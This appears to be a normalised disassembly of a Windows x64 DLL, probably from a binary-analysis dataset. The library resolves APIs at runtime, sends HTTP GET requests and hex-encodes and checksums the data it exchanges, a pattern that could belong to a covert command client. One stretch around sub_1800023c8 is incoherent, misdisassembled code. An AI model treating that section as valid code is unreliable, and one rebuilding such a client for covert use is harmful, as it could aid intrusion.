sub_180002280
push rbx
sub rsp 0x20
mov rbx rcx
call sub_1800031c4
mov rcx rbx
call sub_18000324c
and [ rbx + 0x858 ] 0x0
mov rcx rbx
call sub_1800032ac
test al al
jne r-xdata
mov al 0x1
mov rcx rbx
call sub_1800031c4
mov rcx rbx
call sub_18000324c
and [ rbx + 0x858 ] 0x0
xor al al
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_1800022cc
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x240
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x230 ] rax
mov rax [ rcx + 0x8 ]
mov rbx rcx
mov ecx 0xea60
mov [ rax + 0x84c ] ecx
mov rax [ rbx + 0x8 ]
xor edx edx
mov [ rax + 0x850 ] ecx
mov rax [ rbx + 0x8 ]
lea rcx [ rsp + 0x31 ]
mov [ rax + 0x1171 ] 0x1
mov rdi [ rbx + 0x8 ]
mov r8d 0x1ff
mov [ rsp + 0x30 ] 0x0
call sub_180008e40
xor eax eax
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] 0x0
mov [ rsp + 0x21 ] ax
mov [ rsp + 0x23 ] al
call sub_180005428
mov r8 [ rbx + 0x30 ]
lea rdx [ rw-data ]
lea rcx [ rsp + 0x30 ]
call sub_180006338
xor r8d r8d
xor r9d r9d
lea rdx [ rsp + 0x30 ]
mov rcx rdi
cmp [ rdi + 0x1170 ] r8b
je r-xdata
call sub_180003ad0
call sub_1800036d8
jmp r-xdata
xor al al
mov rcx rdi
call sub_180002c5c
mov rcx rdi
mov bl al
call sub_1800031c4
mov rcx rdi
call sub_18000324c
test bl bl
je r-xdata
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov rcx [ rsp + 0x230 ]
xor rcx rsp
call sub_180006220
mov rbx [ rsp + 0x258 ]
add rsp 0x240
pop rdi
retn
sub_1800023c8
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push rbp
lea rbp [ rax - 0x158 ]
sub rsp 0x250
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x140 ] rax
mov rbx rcx
mov ecx 0x4
call sub_1800061e1
mov rcx [ rbp + 0x48 ]
xor eax 0x52b843d2
add eax [ rdx ]
add dl ch
sub ebp [ rax + rax + 0x2 ]
lea rcx [ rbx + 0x1a ]
lea rcx [ rcx + 0x1a ]
call rw-data
mov rdx [ rbp + 0x48 ]
add rsp 0x20002ec
mov cl [ rdx ]
add rax rax
mov cl [ rdx ]
inc rsp
test bl cl
jne r-xdata
lea rax [ rbx + 0x1a ]
lea rcx [ rbx + 0x4a ]
sub_18000252d
adc eax 0x3d42c
mov rcx rdx
call [ rdi ]
test [ rbp + 0x1 ] ecx
add cl [ rax - 0x73 ]
clc
test rdx rax
je r-xdata
and al 0x22
lea rax [ rbx + 0x4a ]
test ebx ecx
mov r10d 0x20002fc
seta cl
xor eax 0xa488ad2
lea rax [ rbx + 0x4a ]
call [ rdi ]
fisttp [ rbp + 0x1 ]
add cl [ rax - 0x71 ]
push rsp
and [ rdx - 0x75 ] cl
0xd9ff
sub_1800025bd
outsd
add [ rdx ] al
lea rcx [ rbx + 0x4a ]
mov [ rbx + 0x20002e8 ] eax
lea rax [ rbx + 0x4a ]
mov ecx 0x20006
enter 0x200 0xe8
out 0x3b al
add [ rax ] al
mov rcx [ rbp + 0x140 ]
xor rcx rsp
call sub_180006220
lea r11 [ rsp + 0x250 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
sub_180002604
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
mov rax [ rcx + 0x8 ]
mov rsi rcx
xor r9d r9d
mov [ rax + 0x850 ] 0x1d4c0
mov rax [ rcx + 0x8 ]
xor r8d r8d
mov ecx 0x7
mov dl 0x3
mov [ rax + 0x84c ] 0x1d4c0
call sub_180001000
xor edi edi
test rax rax
je r-xdata
xor al al
mov rcx [ rsi + 0x8 ]
mov rdx rax
call sub_180003558
test al al
je r-xdata
call [ GetProcessHeap@IAT ]
lea r8d [ rdi + 0x10 ]
xor edx edx
mov rcx rax
call [ HeapAlloc@IAT ]
mov rbx [ rsi + 0x8 ]
mov rcx rbx
mov rdx rax
mov r12 rax
call sub_180002e04
test al al
je r-xdata
cmp [ rbx ] dil
je r-xdata
mov rcx rbx
call sub_1800031c4
mov rcx rbx
call sub_18000324c
cmp [ rbx ] 0x1
jne r-xdata
mov rbp [ r12 ]
test [ rbp + 0x9 ] 0xf800
jne r-xdata
mov rbx [ rsi + 0x8 ]
mov rcx rbx
call sub_1800031c4
mov rcx rbx
call sub_18000324c
mov rcx r12
call sub_1800011bc
test al al
je r-xdata
cmp [ rbp + 0x9 ] 0x5
jne r-xdata
movsxd r13 [ rbp + 0xe ]
lea eax [ r13 + 0x1 ]
movsxd rbx eax
call [ GetProcessHeap@IAT ]
mov r8 rbx
mov rcx rax
xor edx edx
call [ HeapAlloc@IAT ]
mov rbx rax
test rax rax
je r-xdata
mov r8d [ rbp + 0xe ]
xor edx edx
mov rcx rax
inc r8d
call sub_180008e40
mov rdx [ r12 ]
mov r8 r13
add rdx 0x12
mov rcx rbx
call sub_180006a70
mov rcx r12
call sub_1800012bc
mov rsi [ rsi ]
mov rcx rbx
call sub_180005890
test rax rax
je r-xdata
mov al dil
jmp r-xdata
mov rcx rax
call sub_180005a98
mov r11 rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
mov rax [ rsi ]
lea r8 [ rw-data ]
mov rcx [ rax + 0x8 ]
mov rdx [ rax + 0x10 ]
mov eax 0x927c0
mov [ rcx + 0x84c ] eax
mov [ rcx + 0x850 ] 0x1d4c0
mov [ rdx + 0x84c ] eax
mov [ rdx + 0x850 ] 0x1d4c0
call r11
mov dil al
sub_1800027c8
sub rsp 0x28
cmp r8d 0x1f
je r-xdata
add rsp 0x28
retn
cmp r8d 0x29
je r-xdata
cmp r8d 0x3c
je r-xdata
test rdx rdx
je r-xdata
cmp r8d 0x64
jne r-xdata
mov al [ rdx + 0x84a ]
cmp al 0x1
jne r-xdata
test rdx rdx
je r-xdata
test al al
jne r-xdata
mov rax [ r9 ]
mov rcx [ rdx + 0x830 ]
mov [ rdx + 0x820 ] rax
jmp r-xdata
cmp [ r9 + 0x8 ] 0x0
mov rcx [ rdx + 0x838 ]
setne al
mov [ rdx + 0x840 ] al
jmp r-xdata
mov rax [ r9 ]
mov rcx [ rdx + 0x828 ]
mov [ rdx + 0x818 ] rax
call [ SetEvent@IAT ]
sub_180002844
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi rcx
mov ecx 0x8
call sub_180006294
xor esi esi
mov rbx rax
test rax rax
je r-xdata
mov rbx rsi
xor r8d r8d
xor edx edx
xor ecx ecx
call [ CreateMutexW@IAT ]
mov [ rbx ] rax
jmp r-xdata
mov [ rdi + 0x858 ] esi
mov [ rdi + 0x8 ] rsi
mov [ rdi + 0x810 ] rsi
mov [ rdi + 0x818 ] rsi
mov [ rdi + 0x820 ] rsi
mov [ rdi + 0x838 ] rsi
mov [ rdi + 0x828 ] rsi
mov [ rdi + 0x830 ] rsi
mov [ rdi + 0x846 ] 0x544547
mov eax [ r--data ]
mov ebx 0x200
lea rcx [ rdi + 0x86c ]
mov [ rdi + 0x841 ] eax
mov al [ r--data ]
mov r8d ebx
mov [ rdi + 0x845 ] al
mov eax 0xea60
xor edx edx
mov [ rdi + 0x84c ] eax
mov [ rdi + 0x850 ] eax
call sub_180008e40
lea rcx [ rdi + 0xa70 ]
mov r8d ebx
xor edx edx
call sub_180008e40
mov ebx 0x100
lea rcx [ rdi + 0xe70 ]
mov r8d ebx
xor edx edx
mov [ rdi + 0xa6c ] esi
mov [ rdi + 0x868 ] esi
mov [ rdi ] 0x2
mov [ rdi + 0x1171 ] si
mov [ rdi + 0x1170 ] sil
call sub_180008e40
lea rcx [ rdi + 0xf70 ]
mov r8d ebx
xor edx edx
call sub_180008e40
lea rcx [ rdi + 0x1070 ]
mov r8d ebx
xor edx edx
call sub_180008e40
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rax rdi
add rsp 0x20
pop rdi
retn
lea rcx [ rw-data ]
call [ LoadLibraryA@IAT ]
lea rdx [ rw-data ]
mov rcx rax
mov rbx rax
call [ GetProcAddress@IAT ]
lea rdx [ rw-data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ rw-data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ rw-data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ rw-data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ rw-data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ rw-data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ rw-data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ rw-data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ rw-data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ rw-data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ rw-data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ rw-data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov [ rw-data ] rax
cmp [ rw-data ] rsi
mov [ rdi + 0x860 ] rbx
jne r-xdata
sub_180002ac4
mov [ rsp + 0x18 ] r8d
push rbp
push rbx
push rsi
push rdi
push r12
mov rbp rsp
sub rsp 0x70
mov rbx rcx
mov rcx [ rcx + 0x820 ]
mov r12 rdx
xor esi esi
lea r9 [ rbp + 0x48 ]
lea r8 [ rbp + 0x30 ]
and [ rbp + 0x30 ] esi
and [ rsp + 0x20 ] rsi
mov edx 0x20000013
mov [ rbp + 0x48 ] 0x4
call [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rbp + 0x30 ]
cmp eax 0xc8
je r-xdata
call [ GetLastError@IAT ]
mov edi [ rbp + 0x40 ]
mov rcx [ rbx + 0x820 ]
and [ rsp + 0x20 ] rsi
lea r9 [ rbp + 0x40 ]
mov r8 r12
mov edx 0x16
mov [ rbx + 0x858 ] eax
call [ rw-data ]
xor edx edx
lea rcx [ rbp - 0x40 ]
lea r8d [ rdx + 0x38 ]
call sub_180008e40
mov eax [ rbp + 0x40 ]
mov rcx [ rbx + 0x820 ]
lea rdx [ rbp - 0x40 ]
mov r9 rbx
mov r8d 0x1
mov [ rbp - 0x18 ] eax
mov [ rbp - 0x40 ] 0x38
mov [ rbp - 0x20 ] r12
call [ rw-data ]
mov ecx 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
add rsp 0x70
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov eax esi
xor edx edx
lea rcx [ rbp - 0x40 ]
lea r8d [ rdx + 0x38 ]
call sub_180008e40
mov rcx [ rbx + 0x820 ]
lea rdx [ rbp - 0x40 ]
mov r9 rbx
mov r8d 0x1
mov [ rbp - 0x40 ] 0x38
mov [ rbp - 0x20 ] r12
mov [ rbp - 0x18 ] edi
mov [ rbp - 0x14 ] edi
call [ rw-data ]
test eax eax
jne r-xdata
mov rcx rbx
call sub_1800031c4
mov rcx rbx
call sub_18000324c
or eax 0xffffffff
jmp r-xdata
mov ecx [ rbp - 0x18 ]
test ecx ecx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x3e5
jne r-xdata
mov edi [ rbp + 0x40 ]
add r12 rcx
sub edi ecx
add esi ecx
mov [ rbp + 0x40 ] edi
jmp r-xdata
mov [ rbx + 0x858 ] eax
mov edx [ rbx + 0x84c ]
mov rcx [ rbx + 0x838 ]
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
test edi edi
jle r-xdata
mov [ rbx + 0x858 ] 0x102
jmp r-xdata
cmp [ rbx + 0x840 ] 0x0
jne r-xdata
sub_180002c5c
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rbp
push rdi
push r12
push r13
push r14
lea rbp [ rsp - 0x340 ]
sub rsp 0x440
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x330 ] rax
mov r14 rcx
lea rcx [ rsp + 0x31 ]
xor ebx ebx
xor edx edx
mov r8d 0x3ff
mov [ rsp + 0x30 ] bl
call sub_180008e40
lea r13d [ rbx + 0x10 ]
lea rdx [ rsp + 0x30 ]
mov r8d r13d
mov rcx r14
mov r12d ebx
call sub_180002ac4
mov edi eax
test eax eax
jle r-xdata
xor al al
lea rsi [ rsp + 0x30 ]
lea rcx [ rax + 0x1 ]
call sub_180006430
mov r11d eax
mov eax 0x51eb851f
imul r11d
mov r13d edx
sar r13d 0x5
mov eax r13d
shr eax 0x1f
add r13d eax
mov esi r13d
sub esi r12d
cmp r13d r12d
jle r-xdata
movsxd rax r12d
mov r8d r13d
mov rcx r14
lea rsi [ rsp + rax + 0x30 ]
mov rdx rsi
call sub_180002ac4
mov edi eax
test eax eax
jg r-xdata
sub edi r13d
test esi esi
jle r-xdata
mov edx 0x23
mov rcx rsi
call sub_18000678c
add r12d edi
test rax rax
jne r-xdata
cmp esi r12d
jae r-xdata
movsxd rax r13d
lea rcx [ rsp + 0x20 ]
movsxd r8 esi
lea rdx [ rsp + rax + 0x30 ]
call sub_180006a70
mov ecx [ rsp + 0x20 ]
mov edi ebx
jmp r-xdata
mov edi 0x200
mov eax ecx
not eax
cmp [ rsp + 0x24 ] eax
jne r-xdata
movsxd rax esi
sub r12d esi
mov rcx r14
lea rdx [ rsp + rax + 0x20 ]
mov r8d r12d
call sub_180002ac4
test eax eax
jle r-xdata
xor eax eax
mov esi edi
mov ecx ebx
lea r12d [ rax + 0xc ]
mov [ rsp + 0x20 ] rbx
mov [ rsp + 0x28 ] eax
cmp edi r12d
cmova esi r12d
test edi edi
jle r-xdata
sub esi eax
test esi esi
jg r-xdata
mov al bl
jmp r-xdata
ror ecx 0x7
cmp [ rsp + 0x28 ] ecx
jne r-xdata
mov ecx [ rsp + 0x20 ]
mov r8d esi
cmp esi edi
lea rdx [ rsp + 0x30 ]
cmovg r8d edi
mov rcx r14
call sub_180002ac4
test eax eax
jle r-xdata
mov rcx [ rbp + 0x330 ]
xor rcx rsp
call sub_180006220
lea r11 [ rsp + 0x440 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rbp
retn
mov bl 0x1
sub_180002e04
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rbp
push rdi
push r12
push r13
push r15
lea rbp [ rsp - 0x350 ]
sub rsp 0x450
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x340 ] rax
mov r13 rcx
mov r12 rdx
lea rcx [ rsp + 0x41 ]
xor edx edx
mov r8d 0x3ff
mov [ rsp + 0x40 ] 0x0
call sub_180008e40
and [ r12 ] 0x0
mov r15d 0x200
lea rdx [ rsp + 0x40 ]
mov r8d r15d
mov rcx r13
call sub_180002ac4
mov edi eax
test eax eax
jg r-xdata
xor esi esi
lea rcx [ rsp + 0x40 ]
lea edx [ rsi + 0x23 ]
call sub_18000678c
test rax rax
je r-xdata
xor al al
jmp r-xdata
mov ebx esi
sub ebx edi
cmp esi edi
jg r-xdata
lea rcx [ rax + 0x1 ]
call sub_180006430
mov r11d eax
mov eax 0x51eb851f
imul r11d
mov esi edx
sar esi 0x5
mov eax esi
shr eax 0x1f
add esi eax
mov rcx [ rbp + 0x340 ]
xor rcx rsp
call sub_180006220
lea r11 [ rsp + 0x450 ]
mov rbx [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r13
pop r12
pop rdi
pop rbp
retn
test ebx ebx
jg r-xdata
sub edi esi
mov r8d ebx
cmp ebx r15d
lea rdx [ rsp + 0x40 ]
cmovg r8d r15d
mov rcx r13
call sub_180002ac4
test eax eax
jle r-xdata
xor edi edi
jmp r-xdata
cmp ebx r15d
jae r-xdata
movsxd rax esi
lea rcx [ rsp + 0x20 ]
movsxd r8 ebx
lea rdx [ rsp + rax + 0x40 ]
call sub_180006a70
sub edi ebx
sub ebx eax
mov r15d 0x12
mov ebx edi
cmp edi r15d
cmova ebx r15d
test edi edi
jle r-xdata
cmp [ rsp + 0x20 ] r15d
jb r-xdata
movsxd rax ebx
mov r8d r15d
mov rcx r13
lea rdx [ rsp + rax + 0x20 ]
sub r8d ebx
call sub_180002ac4
test eax eax
jle r-xdata
mov ebx [ rsp + 0x20 ]
call [ GetProcessHeap@IAT ]
mov r8d ebx
mov rcx rax
xor edx edx
call [ HeapAlloc@IAT ]
mov r8d [ rsp + 0x20 ]
xor edx edx
mov rcx rax
mov [ r12 ] rax
call sub_180008e40
mov r11 [ rsp + 0x20 ]
cmp r11d r15d
je r-xdata
mov rcx [ r12 ]
mov [ rcx ] r11
mov rax [ rsp + 0x28 ]
mov [ rcx + 0x8 ] rax
movzx eax [ rsp + 0x30 ]
mov [ rcx + 0x10 ] ax
mov al 0x1
lea ebx [ r11 - 0x12 ]
test edi edi
jle r-xdata
test ebx ebx
jle r-xdata
mov rcx [ r12 ]
movsxd rax esi
movsxd r8 edi
lea rdx [ rsp + rax + 0x52 ]
add rcx r15
call sub_180006a70
mov r11 [ rsp + 0x20 ]
sub ebx edi
mov rax [ r12 ]
movsxd rdx edi
mov r8d ebx
lea rdx [ rdx + rax + 0x12 ]
mov rcx r13
call sub_180002ac4
cmp eax ebx
je r-xdata
mov r11 [ rsp + 0x20 ]
call [ GetProcessHeap@IAT ]
mov r8 [ r12 ]
xor edx edx
mov rcx rax
call [ HeapFree@IAT ]
and [ r12 ] 0x0
jmp r-xdata
sub_180003028
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
mov rbx rcx
sub rcx rdx
mov al [ rdx ]
inc rdx
mov [ rcx + rdx + 0x86b ] al
test al al
jne r-xdata
mov rcx rbx
sub rcx r9
mov al [ r9 ]
inc r9
mov [ rcx + r9 + 0xa6f ] al
test al al
jne r-xdata
mov rcx [ rsp + 0x68 ]
mov rdx rbx
sub rdx rcx
mov al [ rcx ]
inc rcx
mov [ rdx + rcx + 0xc6f ] al
test al al
jne r-xdata
mov eax [ rsp + 0x60 ]
mov [ rbx + 0xa6c ] r8d
mov ebp 0x100
mov [ rbx + 0x868 ] eax
mov al [ rsp + 0x88 ]
lea rcx [ rbx + 0xe70 ]
mov r8d ebp
xor edx edx
mov [ rbx + 0x1172 ] al
call sub_180008e40
lea rcx [ rbx + 0xf70 ]
mov r8d ebp
xor edx edx
call sub_180008e40
lea rcx [ rbx + 0x1070 ]
mov r8d ebp
xor edx edx
call sub_180008e40
mov r11 [ rsp + 0x70 ]
test r11 r11
je r-xdata
mov rcx [ rsp + 0x78 ]
test rcx rcx
je r-xdata
cmp [ r11 ] 0x0
je r-xdata
mov rcx [ rsp + 0x80 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
je r-xdata
mov rcx rbx
sub rcx r11
mov al [ rbx ]
test al al
jne r-xdata
cmp [ rcx ] 0x0
je r-xdata
mov rdx rbx
sub rdx rcx
mov al [ r11 ]
inc r11
mov [ rcx + r11 + 0xe6f ] al
test al al
jne r-xdata
cmp al 0x1
jne r-xdata
mov rax [ rbx + 0x8 ]
lea rdx [ r--data ]
mov [ rsp + 0x28 ] rax
mov eax [ rbx + 0xa6c ]
mov [ rsp + 0x20 ] eax
jmp r-xdata
mov rdx rbx
sub rdx rcx
mov al [ rcx ]
inc rcx
mov [ rdx + rcx + 0xf6f ] al
test al al
jne r-xdata
xor al al
mov rdx [ rbx + 0x8 ]
mov [ rsp + 0x28 ] rdx
mov edx [ rbx + 0xa6c ]
mov [ rsp + 0x20 ] edx
lea rdx [ r--data ]
lea r9 [ rbx + 0x86c ]
lea r8 [ rbx + 0xa70 ]
lea rcx [ rbx + 0x10 ]
call sub_180006338
mov al 0x1
jmp r-xdata
mov al [ rcx ]
inc rcx
mov [ rdx + rcx + 0x106f ] al
test al al
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_1800031c4
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x820 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x818 ]
test rcx rcx
je r-xdata
call [ rw-data ]
and [ rbx + 0x820 ] 0x0
cmp [ rbx + 0x810 ] 0x0
je r-xdata
call [ rw-data ]
and [ rbx + 0x818 ] 0x0
add rsp 0x20
pop rbx
retn
mov rcx [ rbx + 0x810 ]
xor edx edx
call [ rw-data ]
test rax rax
jne r-xdata
mov rcx [ rbx + 0x810 ]
call [ rw-data ]
mov rcx [ rbx + 0x838 ]
mov edx 0x12c
call [ WaitForSingleObject@IAT ]
and [ rbx + 0x810 ] 0x0
sub_18000324c
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x828 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x830 ]
test rcx rcx
je r-xdata
call [ CloseHandle@IAT ]
and [ rbx + 0x828 ] 0x0
mov rcx [ rbx + 0x838 ]
test rcx rcx
je r-xdata
call [ CloseHandle@IAT ]
and [ rbx + 0x830 ] 0x0
add rsp 0x20
pop rbx
retn
call [ CloseHandle@IAT ]
and [ rbx + 0x838 ] 0x0
sub_1800032ac
push rbx
push rsi
push rdi
push r12
sub rsp 0x58
xor esi esi
mov rbx rcx
mov [ rcx + 0x854 ] sil
cmp [ rcx + 0x810 ] rsi
je r-xdata
mov r12d 0x4
cmp [ rbx + 0xe70 ] sil
je r-xdata
cmp [ rcx + 0x828 ] rsi
je r-xdata
lea rcx [ rsp + 0x80 ]
xor edx edx
mov [ rsp + 0x80 ] esi
call [ rw-data ]
lea rcx [ rbx + 0xa70 ]
mov [ rsp + 0x20 ] 0x10000002
lea r9 [ r--data ]
lea r8 [ r--data ]
test [ rsp + 0x80 ] r12b
jne r-xdata
cmp [ rbx ] sil
jne r-xdata
call sub_1800031c4
mov rcx rbx
call sub_18000324c
xor edx edx
mov edx r12d
jmp r-xdata
cmp [ rbx + 0x1170 ] sil
je r-xdata
cmp [ rbx + 0x1171 ] sil
je r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call [ CreateEventA@IAT ]
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rbx + 0x828 ] rax
call [ CreateEventA@IAT ]
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rbx + 0x838 ] rax
call [ CreateEventA@IAT ]
mov rcx [ rbx + 0x810 ]
lea rdx [ sub_1800027c8 ]
mov [ rbx + 0x830 ] rax
call [ rw-data ]
cmp rax 0xffffffffffffffff
jne r-xdata
call [ GetLastError@IAT ]
mov [ rbx + 0x858 ] eax
call [ rw-data ]
mov [ rbx + 0x810 ] rax
cmp rax rsi
jne r-xdata
xor r9d r9d
lea rcx [ rbx + 0xa70 ]
lea r8 [ rbx + 0xe70 ]
lea edx [ r9 + 0x3 ]
mov [ rsp + 0x20 ] 0x10000002
call [ rw-data ]
mov [ rbx + 0x810 ] rax
test rax rax
jne r-xdata
mov rcx rbx
call sub_180003db4
mov [ rbx + 0x1171 ] sil
mov [ rbx + 0x1170 ] al
mov rcx [ rbx + 0x810 ]
lea r8 [ rsp + 0x88 ]
mov r9d r12d
mov edx 0x2
mov [ rsp + 0x88 ] 0xea60
mov [ rsp + 0x90 ] 0x1
mov [ rsp + 0x98 ] 0x1f4
mov [ rsp + 0x40 ] 0x927c0
call [ rw-data ]
mov rcx [ rbx + 0x810 ]
lea r8 [ rsp + 0x90 ]
mov r9d r12d
mov edx 0x3
call [ rw-data ]
mov rcx [ rbx + 0x810 ]
lea r8 [ rsp + 0x98 ]
mov r9d r12d
mov edx r12d
call [ rw-data ]
mov rcx [ rbx + 0x810 ]
lea r8 [ rsp + 0x40 ]
mov r9d r12d
mov edx 0x6
call [ rw-data ]
movzx r8d [ rbx + 0xa6c ]
mov rcx [ rbx + 0x810 ]
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x30 ] 0x24000000
lea rdx [ rbx + 0x86c ]
xor r9d r9d
mov [ rsp + 0x28 ] 0x3
mov [ rbx + 0x84a ] sil
mov [ rsp + 0x20 ] rsi
call [ rw-data ]
mov [ rbx + 0x818 ] rax
test rax rax
jne r-xdata
call [ GetLastError@IAT ]
mov [ rbx + 0x858 ] eax
add rsp 0x58
pop r12
pop rdi
pop rsi
pop rbx
retn
call [ GetLastError@IAT ]
mov [ rbx + 0x858 ] eax
mov al 0x1
call [ GetLastError@IAT ]
mov [ rbx + 0x858 ] eax
cmp eax 0x3e5
jne r-xdata
xor al al
jmp r-xdata
mov rcx rbx
call sub_1800031c4
mov rcx rbx
call sub_18000324c
jmp r-xdata
mov rcx [ rbx + 0x828 ]
or edx 0xffffffff
call [ WaitForSingleObject@IAT ]
sub_180003558
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x840 ]
sub rsp 0x940
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x830 ] rax
mov rdi [ rdx ]
mov rsi rcx
mov r12 rdx
lea rcx [ rsp + 0x21 ]
xor ebx ebx
xor edx edx
mov r8d 0x103
mov [ rsp + 0x20 ] bl
call sub_180008e40
cmp [ rsi ] bl
je r-xdata
mov rcx rsi
call sub_1800032ac
test al al
je r-xdata
cmp [ rsi ] 0x1
jne r-xdata
mov rcx r12
call sub_1800012bc
mov al bl
mov rcx [ rbp + 0x830 ]
xor rcx rsp
call sub_180006220
mov rbx [ rsp + 0x990 ]
add rsp 0x940
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
movsx ecx [ rsi ]
test ecx ecx
je r-xdata
lea rdx [ rw-data ]
dec ecx
jne r-xdata
mov r9d [ rdi ]
mov r8 [ r12 ]
jmp r-xdata
movsxd rdi [ rdi ]
mov r15 [ r12 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x30 ]
call [ wsprintfA@IAT ]
mov r13 rbx
movsxd rcx eax
lea r14 [ rbp + rcx + 0x30 ]
test rdi rdi
jle r-xdata
lea rdx [ rw-data ]
jmp r-xdata
lea rdx [ rsp + 0x20 ]
mov rcx rsi
cmp [ rsi + 0x1170 ] bl
je r-xdata
xor eax eax
or rdx 0xffffffffffffffff
mov rdi r14
mov rcx rdx
lea r8 [ rbp + 0x30 ]
[ rdi ]
movzx eax [ r--data ]
mov rcx rdx
mov [ rdi - 0x1 ] ax
mov al [ r--data ]
mov [ rdi + 0x1 ] al
lea rdi [ rbp + 0x30 ]
xor eax eax
[ rdi ]
not rcx
lea r9d [ rcx - 0x1 ]
movzx r8d [ r13 + r15 ]
lea rdx [ r--data ]
mov rcx r14
call [ wsprintfA@IAT ]
inc r13
movsxd rcx eax
add r14 rcx
cmp r13 rdi
jl r-xdata
mov r8 [ rsi + 0x8 ]
lea rcx [ rsp + 0x20 ]
call sub_180006338
cmp [ rsi ] bl
jne r-xdata
call sub_180003ad0
call sub_1800036d8
jmp r-xdata
mov bl al
sub_1800036d8
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
lea rbp [ rsp - 0x7a0 ]
sub rsp 0x8a0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x790 ] rax
mov rdi [ rcx + 0x860 ]
mov r14d r9d
mov r13 r8
mov rsi rdx
mov rbx rcx
xor r12d r12d
mov rcx [ rdi ]
mov edx 0x12c
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
mov al [ rbx ]
xor edx edx
cmp al 0x1
jne r-xdata
test al al
jne r-xdata
lea rdx [ rbx + 0x841 ]
jmp r-xdata
cmp [ rbx + 0x1172 ] r12b
mov [ rsp + 0x38 ] rbx
mov ecx 0x84080102
mov eax 0x84880102
lea r9 [ r--data ]
mov r8 rsi
cmovne ecx eax
lea rax [ rbx + 0xc70 ]
mov [ rbx + 0x84a ] 0x1
mov [ rsp + 0x30 ] ecx
mov rcx [ rbx + 0x818 ]
and [ rsp + 0x28 ] r12
mov [ rsp + 0x20 ] rax
call [ rw-data ]
mov [ rbx + 0x820 ] rax
test rax rax
jne r-xdata
lea rdx [ rbx + 0x846 ]
mov esi 0x4
cmp [ rbx + 0x1172 ] r12b
je r-xdata
call [ GetLastError@IAT ]
mov [ rbx + 0x858 ] eax
cmp eax 0x3e5
jne r-xdata
xor edx edx
lea rcx [ rsp + 0x50 ]
lea r8d [ rdx + 0x38 ]
call sub_180008e40
mov esi 0x1
mov rcx [ rbx + 0x820 ]
lea edi [ rsi + 0x1b ]
lea r9 [ rsp + 0x48 ]
lea r8 [ rsp + 0x40 ]
mov edx edi
mov [ rsp + 0x48 ] esi
call [ rw-data ]
mov rcx [ rbx + 0x820 ]
or [ rsp + 0x40 ] 0x3380
